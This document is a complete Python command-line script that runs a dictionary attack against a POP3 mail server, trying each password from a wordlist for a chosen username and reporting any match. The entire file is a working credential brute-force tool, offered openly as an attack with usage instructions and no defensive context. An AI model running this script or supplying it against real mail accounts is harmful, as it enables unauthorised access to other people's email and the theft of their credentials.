import poplib
import sys

def pop3_dictionary_attack(server, port, username, wordlist_file, use_ssl=False):
    """
    Perform a dictionary attack on a POP3 server.

    :param server: POP3 server address
    :param port: POP3 server port (110 for unencrypted, 995 for SSL)
    :param username: Email username
    :param wordlist_file: Path to the wordlist file
    :param use_ssl: Boolean to indicate whether to use SSL
    """
    try:
        with open(wordlist_file, 'r') as file:
            passwords = file.readlines()

        for password in passwords:
            password = password.strip()
            print(f"Trying password: {password}")
            try:
                # Connect to the POP3 server
                if use_ssl:
                    mail_server = poplib.POP3_SSL(server, port)
                else:
                    mail_server = poplib.POP3(server, port)

                mail_server.user(username)
                mail_server.pass_(password)

                print(f"[SUCCESS] Password found: {password}")
                mail_server.quit()
                return True
            except poplib.error_proto as e:
                print(f"[FAILED] Incorrect password: {password}")
            except Exception as e:
                print(f"[ERROR] Unexpected error: {e}")
            finally:
                try:
                    mail_server.quit()
                except:
                    pass

        print("[FAILURE] Password not found in the wordlist.")
        return False
    except FileNotFoundError:
        print(f"Error: The file '{wordlist_file}' was not found.")
        return False
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 6:
        print(f"Usage: python {sys.argv[0]} <server> <port> <username> <wordlist_file> <use_ssl>")
        print("Example: python pop3_attack.py pop.mailserver.com 110 user@example.com wordlist.txt False")
        sys.exit(1)

    server = sys.argv[1]
    port = int(sys.argv[2])
    username = sys.argv[3]
    wordlist_file = sys.argv[4]
    use_ssl = sys.argv[5].lower() in ["true", "yes", "1"]

    pop3_dictionary_attack(server, port, username, wordlist_file, use_ssl)
